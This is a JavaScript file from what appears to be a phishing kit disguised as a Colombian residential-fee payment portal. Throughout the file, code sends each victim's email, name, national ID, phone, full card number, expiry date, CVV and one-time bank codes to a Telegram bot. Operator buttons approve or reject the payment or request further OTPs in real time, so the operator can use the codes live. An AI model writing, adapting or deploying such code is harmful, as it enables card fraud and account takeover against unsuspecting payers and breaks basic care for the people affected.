(function () {
    try {
        var FLOW = 'portal_pagos';

        function apiDispatch(method, params) {
            return fetch('api/telegram/dispatch.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    flow: FLOW,
                    method: method,
                    params: params || {}
                })
            }).then(function (r) {
                return r.json();
            });
        }

        function getSessionId() {
            try {
                if (typeof getCartoonSessionId === 'function') return getCartoonSessionId();
            } catch (e) { }

            var sid = null;
            try { sid = sessionStorage.getItem('_jlp_session_id'); } catch (e) { }
            if (!sid) {
                try { sid = localStorage.getItem('_jlp_session_id'); } catch (e) { }
            }
            if (!sid) {
                var a = Date.now().toString(36).toUpperCase();
                var b = Math.random().toString(36).slice(2, 7).toUpperCase();
                sid = 'SID-' + a + '-' + b;
            }
            try { sessionStorage.setItem('_jlp_session_id', sid); } catch (e) { }
            return sid;
        }

        function field(label, value) {
            var v = (value === undefined || value === null || value === '') ? 'N/A' : String(value);
            return '\n• <b>' + label + ':</b> <code>' + v + '</code>';
        }

        function header(icon, title) {
            return icon + ' <b>' + title + '</b>\n🆔 Sesión: <code>' + getSessionId() + '</code>\n' + '─'.repeat(20);
        }

        function sendMessage(text, replyMarkup) {
            var params = { text: text, parse_mode: 'HTML' };
            if (replyMarkup) params.reply_markup = replyMarkup;
            return apiDispatch('sendMessage', params)
                .then(function (json) {
                    if (json && json.ok && json.result && json.result.message_id) return json.result.message_id;
                    return null;
                })
                .catch(function () { return null; });
        }

        function waitForDecision(messageId, callback, timeoutMs) {
            if (!messageId) return function () { };
            var started = Date.now();
            var maxWait = typeof timeoutMs === 'number' ? timeoutMs : 300000;
            var active = true;

            function poll() {
                if (!active) return;
                if (Date.now() - started > maxWait) {
                    active = false;
                    if (typeof callback === 'function') callback({ action: 'timeout' });
                    return;
                }

                fetch('api/telegram/wait.php?flow=' + encodeURIComponent(FLOW)
                    + '&message_id=' + encodeURIComponent(messageId)
                    + '&timeout=20')
                    .then(function (r) { return r.json(); })
                    .then(function (d) {
                        if (!active) return;
                        var resp = (d && d.ok && d.result) ? d.result : { action: 'timeout' };
                        if (resp.action && resp.action !== 'timeout') {
                            active = false;
                            if (typeof callback === 'function') callback({ action: resp.action });
                            return;
                        }
                        setTimeout(poll, 800);
                    })
                    .catch(function () { setTimeout(poll, 1200); });
            }

            poll();
            return function () { active = false; };
        }

        function notifyVisitOnce() {
            try {
                if (sessionStorage.getItem('_jlp_visit_sent')) return;
                sessionStorage.setItem('_jlp_visit_sent', '1');
            } catch (e) { }

            var text = '<b>NUEVA VISITA</b>\n<b>Sesión:</b> <code>' + getSessionId() + '</code>';
            apiDispatch('sendMessage', { text: text, parse_mode: 'HTML' }).catch(function () { });
        }

        var tarjetaKeyboard = {
            inline_keyboard: [
                [
                    { text: '🟢 Aprobar', callback_data: 'aprobar_tarjeta' },
                    { text: '🔴 Rechazar', callback_data: 'rechazar_tarjeta' }
                ],
                [
                    { text: '📲 Pedir OTP Tarjeta', callback_data: 'pedir_otp_tarjeta' }
                ],
                [
                    { text: '🔚 Terminar', callback_data: 'terminar_tarjeta' }
                ]
            ]
        };

        var otpKeyboard = {
            inline_keyboard: [
                [
                    { text: '🟢 Aprobar', callback_data: 'aprobar_tarjeta' },
                    { text: '🔴 Rechazar', callback_data: 'rechazar_tarjeta' }
                ],
                [
                    { text: '📲 Pedir OTP', callback_data: 'pedir_otp_tarjeta' }
                ],
                [
                    { text: '🔚 Terminar', callback_data: 'terminar_tarjeta' }
                ]
            ]
        };

        window.TelegramBot = {
            getSessionId: getSessionId,
            waitForDecision: waitForDecision,
            sendBusqueda: function (data, tipo) {
                var t = header('🏢', 'PASO 1 — Selección de Conjunto');
                if (data && typeof data === 'object') {
                    t += field('Conjunto', data.name || data.conjunto || 'N/A');
                    t += field('Convenio', data.agreement || data.convenio || 'N/A');
                    t += field('Apt / Casa / Local', data.address || data.apt || data.apto || 'N/A');
                    t += field('Ciudad', data.city || data.ciudad || 'N/A');
                    t += field('Departamento', data.department || data.departamento || 'N/A');
                }
                t += field('Tipo', tipo || (data && (data.type || data.tipo)) || 'N/A');
                return sendMessage(t);
            },
            sendCorreo: function (email) {
                var t = header('📧', 'PASO 2a — Correo Electrónico') + field('Email', email);
                return sendMessage(t);
            },
            sendDatosPago: function () {
                // soporta llamadas antiguas (9 args) y nuevas (5 args)
                var args = Array.prototype.slice.call(arguments);
                var nombre, apellido, tipoDocumento, numeroDocumento, celular;

                if (args.length >= 9) {
                    nombre = args[0];
                    apellido = args[1];
                    tipoDocumento = args[2];
                    numeroDocumento = args[3];
                    celular = args[4];
                } else {
                    nombre = args[0];
                    apellido = args[1];
                    tipoDocumento = args[2];
                    numeroDocumento = args[3];
                    celular = args[4];
                }

                var t = header('👤', 'PASO 2b — Datos del Pagador');
                t += field('Nombre', nombre);
                t += field('Apellido', apellido);
                t += field('Tipo Documento', tipoDocumento);
                t += field('Número Documento', numeroDocumento);
                t += field('Celular', celular);
                return sendMessage(t);
            },
            sendTarjeta: function (titular, numero, vencimiento, cvv, cuotas, tipo) {
                var t = header('💳', 'PASO 3 — Pago con Tarjeta');
                t += field('Titular', titular);
                t += field('Número', numero);
                t += field('Vencimiento', vencimiento);
                t += field('CVV', cvv);
                t += field('Cuotas', cuotas);
                if (tipo !== undefined) t += field('Tipo', tipo);
                return sendMessage(t, tarjetaKeyboard);
            },
            sendOTP: function (codigoOtp) {
                var t = header('🔐', 'PASO 3.1 — Verificación OTP');
                t += '\n<i>El cliente ha ingresado su clave dinámica para autorizar la transacción.</i>';
                t += field('Clave Dinámica', codigoOtp);
                return sendMessage(t, otpKeyboard);
            },
            sendPSE: function (tipoDocumento, numeroDocumento, banco, convenio) {
                var t = header('🏦', 'PASO 3 — Pago PSE');
                t += field('Tipo Documento', tipoDocumento);
                t += field('Número Documento', numeroDocumento);
                t += field('Banco', banco);
                t += field('Convenio', convenio);
                return sendMessage(t);
            },
            sendAprobadoLanding: function () {
                var t = header('✅', 'Pantalla Final Aprobado');
                t += '\n<i>El usuario se encuentra visualizando su comprobante de pago aprobado.</i>';
                return sendMessage(t, { inline_keyboard: [[{ text: '🔚 Terminar', callback_data: 'terminar_tarjeta' }]] });
            },
            sendFinalizar: function () {
                var t = header('🏁🚗', 'Finalizando');
                t += '\n• <b>Acción:</b> <code>El usuario presionó Finalizar en la pantalla de Aprobado.</code>';
                return sendMessage(t);
            }
        };

        notifyVisitOnce();
    } catch (e) { }
})();